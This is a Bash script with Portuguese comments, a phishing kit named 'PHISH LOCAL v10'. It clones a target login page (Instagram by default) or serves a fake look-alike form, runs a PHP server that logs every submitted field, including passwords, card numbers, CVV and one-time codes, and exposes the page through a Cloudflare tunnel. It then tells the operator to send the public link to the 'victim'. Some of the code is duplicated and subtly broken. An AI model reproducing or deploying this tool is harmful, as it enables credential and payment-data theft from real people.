#!/bin/bash
# ============================================
# 🎣 PHISH LOCAL v10 - PHP Server (estilo zphisher)
# Captura QUALQUER campo de QUALQUER site
# Cloudflare Tunnel | Sem root | Sem login
# ============================================

SITE_DIR="site_clone"
LOG_FILE="capturas.txt"

## PHP SERVER TEMPLATE (escrito inline, sem cat/heredoc)
start_php_server() {
    local port=$1
    local redirect_url=$2
    local wordlist_json=$3

    cat > server.php << 'PHPEOF'
<?php
$PORT = 8080;
$SITE_DIR = "site_clone";
$LOG_FILE = "capturas.txt";
$REDIRECT = "https://instagram.com";
?>
PHPEOF

    # Escreve wordlist como JSON
    echo '<?php' > server.php
    echo '$WORDLIST = '"$wordlist_json"';' >> server.php
    echo '$REDIRECT = "'"$redirect_url"'";' >> server.php
    echo '$LOG_FILE = "capturas.txt";' >> server.php
    echo '$SITE_DIR = "site_clone";' >> server.php
    echo '' >> server.php
    cat >> server.php << 'PHPEOF'

function classifyField($name) {
    $name = strtolower(preg_replace('/[^a-z0-9_]/', '', $name));
    $found = false;
    foreach ($WORDLIST as $w) {
        if (strpos($name, $w) !== false || strpos($w, $name) !== false) {
            $found = true;
            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', $w)) return 'USUARIO';
            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', $w)) return 'SENHA';
            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', $w)) return 'NOME';
            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', $w)) return 'DATA';
            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', $w)) return 'ENDERECO';
            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', $w)) return 'ESCOLA_TRABALHO';
            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', $w)) return 'PAGAMENTO';
            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', $w)) return 'SEGURANCA';
            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', $w)) return 'PREFERENCIA';
            return 'EXTRA';
        }
    }
    return 'OUTRO';
}

$wordlist_json = '<?php echo $wordlist_json; ?>';
?>
PHPEOF

    # Agora escreve o router principal
    cat >> server.php << 'PHPEOF'
<?php
$_SERVER['REQUEST_URI'] = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$uri = $_SERVER['REQUEST_URI'];

// POST = capturar
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $timestamp = date('Y-m-d H:i:s');
    $data = $_POST;
    $classified = array(
        'USUARIO' => array(),
        'SENHA' => array(),
        'NOME' => array(),
        'DATA' => array(),
        'ENDERECO' => array(),
        'ESCOLA_TRABALHO' => array(),
        'PAGAMENTO' => array(),
        'SEGURANCA' => array(),
        'PREFERENCIA' => array(),
        'EXTRA' => array(),
        'OUTRO' => array()
    );
    foreach ($data as $k => $v) {
        $cat = classifyField($k);
        $classified[$cat][] = "$k: $v";
    }
    $log = json_encode(array('timestamp' => $timestamp, 'ip' => $ip, 'fields' => $data, 'classified' => $classified)) . "\n";
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
    header("Location: $REDIRECT");
    exit;
}

// GET = servir arquivo
if ($uri === '/' || $uri === '') $uri = '/index.html';
$path = realpath($SITE_DIR . $uri);
if ($path && strpos($path, realpath($SITE_DIR)) === 0 && is_file($path)) {
    $ext = pathinfo($path, PATHINFO_EXTENSION);
    $mime = array(
        'html' => 'text/html', 'css' => 'text/css', 'js' => 'application/javascript',
        'png' => 'image/png', 'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
        'gif' => 'image/gif', 'svg' => 'image/svg+xml', 'ico' => 'image/x-icon',
        'webp' => 'image/webp', 'woff' => 'font/woff', 'woff2' => 'font/woff2'
    );
    header('Content-Type: ' . ($mime[strtolower($ext)] ?? 'application/octet-stream'));
    readfile($path);
    exit;
}

// Fallback: página de login
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}
h1{font-size:44px;font-weight:300;margin-bottom:30px}
input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}
input:focus{border-color:#a8a8a8}
button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}
button:active{background:#1877f2}
</style>
</head>
<body>
<div class="card"><h1>Login</h1>
<form method="POST">
<input type="text" name="username" placeholder="Usuario ou email" required>
<input type="password" name="password" placeholder="Senha" required>
<button type="submit">Entrar</button>
</form></div>
</body>
</html>
<?php
PHPEOF

    # Iniciar PHP server
    cd $(dirname server.php)
    php -S 0.0.0.0:$PORT > /dev/null 2>&1 &
    echo $!
}

# ============ MENU ============
clear
echo ""
echo "=========================================="
echo "  🎣 PHISH LOCAL v10 (PHP)"
echo "=========================================="
echo ""
echo "  1) Criar phishing"
echo "  2) Ver capturas"
echo "  3) Limpar capturas"
echo "  4) Sair"
echo ""
echo -n "Escolha: "
read CHOICE

case "$CHOICE" in
1)
    echo ""
    echo -n "URL do site (ex: https://instagram.com): "
    read URL
    URL=$(echo "$URL" | tr -d '\r\n' | xargs)
    [ -z "$URL" ] && URL="https://instagram.com"
    if ! echo "$URL" | grep -qE '^https?://'; then
        URL="https://$URL"
    fi
    DOMAIN=$(echo "$URL" | sed -E 's|https?://||;s|/.*||')
    echo ""
    echo "[!] Alvo: $URL"

    # --- CLONAR SITE ---
    echo "[...] Clonando site..."
    rm -rf "$SITE_DIR"
    mkdir -p "$SITE_DIR"

    USER_AGENT="Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    curl -s -L -H "User-Agent: $USER_AGENT" -o "$SITE_DIR/index.html" "$URL" 2>/dev/null

    if [ ! -s "$SITE_DIR/index.html" ]; then
        echo "[!] Nao foi possivel clon. Usando fallback."
        cat > "$SITE_DIR/index.html" << 'EOF'
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}h1{font-size:44px;font-weight:300;margin-bottom:30px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}input:focus{border-color:#a8a8a8}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}button:active{background:#1877f2}</style>
</head>
<body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Usuario ou email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body></html>
EOF
    fi

    # Ajustar forms
    sed -i 's/<form/<form method="POST">/gi' "$SITE_DIR/index.html" 2>/dev/null

    echo "[OK] Site clonado!"

    # --- PEGAR IP ---
    PORT=8080
    IP=$(ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    [ -z "$IP" ] && IP=$(ip addr show 2>/dev/null | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$IP" ] && IP="127.0.0.1"

    # --- CLOUDFLARE TUNNEL ---
    CF_INSTALLED=false
    if command -v cloudflared &>/dev/null; then
        CF_INSTALLED=true
    fi

    echo ""
    echo "=========================================="
    echo "  CLOUDFLARE TUNNEL (Link Publico Gratis)"
    echo "=========================================="
    echo ""

    if [ "$CF_INSTALLED" = true ]; then
        echo "[OK] Cloudflared ja instalado!"
        echo ""
        echo "  1) Usar Cloudflare Tunnel (recomendado)"
        echo "  2) Usar so o IP local ($IP:$PORT)"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE
    else
        echo "Cloudflared nao instalado."
        echo ""
        echo "Para instalar (recomendado):"
        echo "  pkg install cloudflared"
        echo ""
        echo "  1) Usar so o IP local ($IP:$PORT)"
        echo "  2) Instalar cloudflared e usar Tunnel"
        echo ""
        echo -n "Escolha: "
        read CF_CHOICE

        if [ "$CF_CHOICE" = "2" ]; then
            echo "[...] Instalando cloudflared..."
            pkg install cloudflared -y 2>/dev/null
            if command -v cloudflared &>/dev/null; then
                CF_INSTALLED=true
                CF_CHOICE=1
                echo "[OK] Instalado!"
            else
                echo "[ERRO] Falha. Usando IP local."
                CF_CHOICE=1
            fi
        else
            CF_CHOICE=2
        fi
    fi

    # --- INICIAR SERVIDOR PHP ---
    echo ""
    echo "[*] Iniciando servidor PHP..."
    echo ""

    # Criar server.php com wordlist embutida
    WORDLIST_JSON='["login","signin","sign_in","log_in","entrar","acessar","iniciar","cadastrar","registrar","username","user","email","e-mail","telefone","phone","cpf","cnpj","matricula","identifier","userid","password","senha","pass","passwd","pwd","palavra","chave","secret","pin","codigo","nome","name","fullname","firstname","lastname","sobrenome","social_name","razao_social","mae","pai","data","date","nascimento","birth","birthdate","ano","mes","dia","endereco","rua","avenida","address","street","cep","zip","zipcode","bairro","cidade","pais","country","complemento","empresa","company","trabalho","profissao","escola","universidade","curso","departamento","cargo","cartao","card","credit_card","cvv","validade","conta","banco","agencia","pix","token","otp","verification","captcha","2fa","auth","pergunta","resposta","termos","terms","privacidade","privacy","aceitar","remember","newsletter"]'

    # Escrever server.php_wordLIST_JSON="$WORDLIST_JSON"

    echo '<?php' > server.php
    echo "\$WORDLIST = $WORDLIST_JSON;" >> server.php
    echo "\$REDIRECT = \"https://instagram.com\";" >> server.php
    echo "\$LOG_FILE = \"capturas.txt\";" >> server.php
    echo "\$SITE_DIR = \"site_clone\";" >> server.php
    echo '' >> server.php
    cat >> server.php << 'PHPEOF'

function classifyField($name) {
    $name = strtolower(preg_replace('/[^a-z0-9_]/', '', $name));
    foreach ($WORDLIST as $w) {
        if (strpos($name, $w) !== false || strpos($w, $name) !== false) {
            if (preg_match('/login|signin|sign_in|log_in|entrar|acessar|iniciar|cadastrar|registrar|username|user|email|e-mail|telefone|phone|cpf|cnpj|matricula|identifier|userid/', $w)) return 'USUARIO';
            if (preg_match('/password|senha|pass|passwd|pwd|palavra|chave|secret|pin|codigo/', $w)) return 'SENHA';
            if (preg_match('/nome|name|fullname|firstname|lastname|sobrenome|social_name|razao_social|mae|pai/', $w)) return 'NOME';
            if (preg_match('/data|date|nascimento|birth|birthdate|ano|mes|dia/', $w)) return 'DATA';
            if (preg_match('/endereco|rua|avenida|address|street|cep|zip|zipcode|bairro|cidade|pais|country|complemento/', $w)) return 'ENDERECO';
            if (preg_match('/empresa|company|trabalho|profissao|escola|universidade|curso|departamento|cargo|matricula/', $w)) return 'ESCOLA_TRABALHO';
            if (preg_match('/cartao|card|credit_card|cvv|validade|conta|banco|agencia|pix/', $w)) return 'PAGAMENTO';
            if (preg_match('/token|otp|verification|captcha|2fa|auth|pergunta|resposta/', $w)) return 'SEGURANCA';
            if (preg_match('/termos|terms|privacidade|privacy|aceitar|remember|newsletter/', $w)) return 'PREFERENCIA';
            return 'EXTRA';
        }
    }
    return 'OUTRO';
}

ob_implicit_flush(false);
while (ob_get_level()) ob_end_clean();

$_SERVER['REQUEST_URI'] = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$uri = $_SERVER['REQUEST_URI'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    $timestamp = date('Y-m-d H:i:s');
    $data = $_POST;
    $classified = array(
        'USUARIO' => array(), 'SENHA' => array(), 'NOME' => array(),
        'DATA' => array(), 'ENDERECO' => array(), 'ESCOLA_TRABALHO' => array(),
        'PAGAMENTO' => array(), 'SEGURANCA' => array(), 'PREFERENCIA' => array(),
        'EXTRA' => array(), 'OUTRO' => array()
    );
    foreach ($data as $k => $v) {
        $cat = classifyField($k);
        $classified[$cat][] = "$k: $v";
    }
    $log = json_encode(array('timestamp' => $timestamp, 'ip' => $ip, 'fields' => $data, 'classified' => $classified)) . "\n";
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
    header("Location: $REDIRECT");
    exit;
}

if ($uri === '/' || $uri === '') $uri = '/index.html';
$path = realpath($SITE_DIR . $uri);
if ($path && strpos($path, realpath($SITE_DIR)) === 0 && is_file($path)) {
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
    $mime = array('html'=>'text/html','css'=>'text/css','js'=>'application/javascript','png'=>'image/png','jpg'=>'image/jpeg','jpeg'=>'image/jpeg','gif'=>'image/gif','svg'=>'image/svg+xml','ico'=>'image/x-icon','webp'=>'image/webp','woff'=>'font/woff','woff2'=>'font/woff2','json'=>'application/json');
    header('Content-Type: ' . ($mime[$ext] ?? 'application/octet-stream'));
    readfile($path);
    exit;
}

header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont:"Segoe UI",Roboto,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:4px;padding:40px 45px;width:350px;text-align:center}h1{font-size:44px;font-weight:300;margin-bottom:30px}input{width:100%;padding:12px;margin:6px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:14px;background:#fafafa;outline:none;box-sizing:border-box}input:focus{border-color:#a8a8a8}button{width:100%;padding:10px;margin-top:16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer}button:active{background:#1877f2}</style>
</head>
<body><div class="card"><h1>Login</h1><form method="POST"><input type="text" name="username" placeholder="Usuario ou email" required><input type="password" name="password" placeholder="Senha" required><button type="submit">Entrar</button></form></div></body>
</html>
PHPEOF

    # Iniciar PHP server
    cd "$(pwd)"
    php -S 0.0.0.0:$PORT > /tmp/php_server.log 2>&1 &
    SERVER_PID=$!
    sleep 2

    echo "[OK] Servidor PHP ativo na porta $PORT"

    # --- CLOUDFLARE TUNNEL ---
    CF_URL=""
    if [ "$CF_CHOICE" = "1" ] && [ "$CF_INSTALLED" = true ] && command -v cloudflared &>/dev/null; then
        echo ""
        echo "[...] Criando tunnel... aguarde..."
        echo ""

        if [ "$IP" != "127.0.0.1" ] && [ -n "$IP" ]; then
            CF_TARGET="http://${IP}:$PORT"
        else
            CF_TARGET="http://localhost:$PORT"
        fi

        cloudflared tunnel --url "$CF_TARGET" > /tmp/cf_tunnel.log 2>&1 &
        CF_PID=$!

        for i in $(seq 1 20); do
            sleep 1
            CF_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf_tunnel.log 2>/dev/null | head -1)
            if [ -n "$CF_URL" ]; then
                break
            fi
        done

        if [ -n "$CF_URL" ]; then
            echo "[OK] Tunnel criado!"
        else
            echo "[AVISO] Tunnel nao gerou URL em 20s."
            echo "[DEBUG] Log:"
            head -5 /tmp/cf_tunnel.log
            echo "[INFO] Usando IP local: $CF_TARGET"
        fi
    fi

    # --- MOSTRAR RESULTADO ---
    clear
    echo ""
    echo "=========================================="
    echo "         SERVIDOR PRONTO!"
    echo "=========================================="
    echo ""
    if [ -n "$CF_URL" ]; then
        echo "  🔥 URL PUBLICA (MANDE PRA VITIMA):"
        echo ""
        echo "    ${CF_URL}"
        echo ""
        echo "  Funciona de QUALQUER lugar do mundo!"
        echo "  (a pessoa clica e abre o site clonado)"
    else
        echo "  Acesse de qualquer dispositivo na mesma rede:"
        echo "  http://${IP}:${PORT}"
    fi
    echo ""
    echo "  Parar: Ctrl+C"
    echo ""

    if [ -n "$CF_URL" ]; then
        echo ""
        echo "  🔥 LEMBRE-SE - URL da VITIMA:"
        echo "    ${CF_URL}"
        echo ""
    fi

    echo ""
    echo "Aguardando capturas... (Ctrl+C para parar)"
    echo ""

    wait $SERVER_PID
    ;;

2)
    echo ""
    echo "=========================================="
    echo "  CAPTURAS"
    echo "=========================================="
    echo ""
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "Nenhuma captura ainda."
    fi
    echo ""
    echo "Pressione ENTER para voltar..."
    read
    ;;

3)
    > "$LOG_FILE"
    echo "[OK] Capturas limpas!"
    sleep 1
    ;;

4)
    echo "Saindo..."
    exit 0
    ;;

*)
    echo "Opcao invalida!"
    sleep 1
    ;;
esac
